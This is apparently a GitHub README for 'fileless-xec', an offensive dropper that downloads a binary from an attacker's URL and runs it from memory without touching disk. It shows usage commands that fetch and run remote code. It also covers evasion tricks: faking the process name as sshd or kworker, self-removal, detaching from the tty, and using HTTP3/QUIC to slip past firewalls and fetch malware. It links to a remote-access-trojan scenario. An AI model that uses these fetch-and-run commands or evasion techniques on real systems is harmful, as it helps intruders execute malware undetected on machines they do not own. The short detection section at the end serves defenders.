<h1 align=center> ➲ fileless-xec 🦜</h1>

<div align="center"><img src="https://github.com/ariary/fileless-xec/blob/main/img/fileless-small.png"></div>

<div align="center">
<code>👋 Certainly useful , mainly for fun, rougly inspired by 0x00 <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">article</a></code>
</div>
<br>

***Pentest use:*** `fileless-xec` is used on target machine to stealthy execute a binary file located on attacker machine



## ➲ Short story

`fileless-xec` enable us to execute a remote binary on a local machine directly from memory without dropping them on disk

**[➪ Install](https://github.com/ariary/fileless-xec/blob/main/install.md)**

 - simple usage `fileless-xec [binary_url]` (~`curl | sh` for binaries)
 - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd [binary_url]`
 - detach program execution from `tty`: ` fileless-xec --setsid [...]` 

![demo](https://github.com/ariary/fileless-xec/blob/main/img/fileless-xec.gif)

<details>
  <summary><b>Explanation</b></summary>
We want to locally execute <code>writeNsleep</code> binary located on a remote machine. 

We first start a python http server on remote.
Locally we use <code>fileless-xec</code> and impersonate the <code>/usr/sbin/sshd</code> name for the execution of the binary <code>writeNsleep</code>(for stealthiness & fun). Once writeNsleep start fileless-xec will delete itself (<code>--self-remove</code>)

</details>

### Other use cases

* [Execute binary with stdout/stdin](https://github.com/ariary/fileless-xec/blob/main/usage.md#execute-binary-with-stdoutstdin)
* [Execute binary with arguments](https://github.com/ariary/fileless-xec/blob/main/usage.md#execute-binary-with-arguments)
* [`fileless-xec` self remove](https://github.com/ariary/fileless-xec/blob/main/usage.md#fileless-xec-self-remove)
* [Bypass network restriction using ICMP](https://github.com/ariary/fileless-xec/blob/main/usage.md#bypass-network-restriction-with-icmp)
* [Bypass firewall with HTTP3](https://github.com/ariary/fileless-xec/blob/main/usage.md#bypass-firewall-with-http3)
* ["Remote go": execute go binaries without having go installed locally](https://github.com/ariary/fileless-xec/blob/main/usage.md#remote-go-execute-go-binaries-without-having-go-installed-locally)
* [Execute a shell script](https://github.com/ariary/fileless-xec/blob/main/usage.md#execute-a-shell-script)
* [`fileless-xec` server mode](https://github.com/ariary/fileless-xec/blob/main/usage.md#fileless-xec-server-mode)
  * [RAT (Remote Access Trojan) scenario](https://github.com/ariary/fileless-xec/blob/main/usage.md#rat-remote-access-trojan-scenario)
* [`fileless-xec` on windows](https://github.com/ariary/fileless-xec/blob/main/usage.md#fileless-xec-on-windows)


## ➲ Stealthiness story

* The binary file is not mapped into the host file system
* The execution program name could be customizable
* Bypass 3rd generation firewall could be done with http3 support
* `fileless-xec` self removes once launched

### memfd_create
The remote binary file is stored locally using `memfd_create` syscall, which store it within a _memory disk_ which is not mapped into the file system (*ie* you can't find it using `ls`).

### fexecve
Then we execute it using `fexecve` syscall (as it is currently not provided by `syscall` golang library we implement it). 

> With `fexecve` we could exec a program, but we reference the program to run using a
> file descriptor, instead of the full path.

### HTTP3/QUIC
<table><tr><td>
Enable it with <code>-Q</code>/<code>http3</code>  flag. <br>
You can setup a light web rootfs server supporting http3 by running <code>go run ./test/http3/light-server.go -p LISTENING PORT</code> (This is http3 equivalent of <code>python3 -m http.server <listening_port></code>)<br>
use <code>test/http3/genkey.sh</code> to generate cert and key.

 
 </td></tr></table>
 
`QUIC` UDP aka `http3` is a new generation Internet protocol that speeds online web applications that are susceptible to delay, such as searching, video streaming etc., by reducing the round-trip time (RTT) needed to connect to a server.

Because QUIC uses proprietary encryption equivalent to TLS (this will change in the future with a standardized version), **3rd generation firewalls that provide application control and visibility encounter difficulties to control and monitor QUIC traffic**.

If you actually use `fileless-xec` as a dropper (***Only for testing purpose or with the authorization***), you likely want to execute some type of malwares or other file that could be drop by packet analysis. Hence, with Quic enables you could **bypass packet analysis and GET a malware**.

Also, in case firewall is only used for allowing/blocking traffic it could happen that **firewall rules forget the udp protocol making your requests go under the radars**

### other skill for stealthiness

Although not present on the memory disk, the running program can still be detected using `ps` command for example. 

 1. Cover the tracks with a fake program name
 
`fileless-xec --name <fake_name> <binary_raw_url>` by default the name is `[kworker/u:0]` 

 2. Detach from tty to map behaviour of deamon process
 
`fileless-xec --setsid <binary_raw_url>`.

### Caveats
You could still be detected with:
```
$ lsof | grep memfd
```

Or also [`opensnoop`](https://github.com/brendangregg/perf-tools/blob/master/opensnoop) (but not by [`execsnoop`](https://github.com/brendangregg/perf-tools/blob/master/execsnoop))

Or seccomp profile auditing `execve` syscall (but it is very overwhelming as a `sleep` command also use execve)
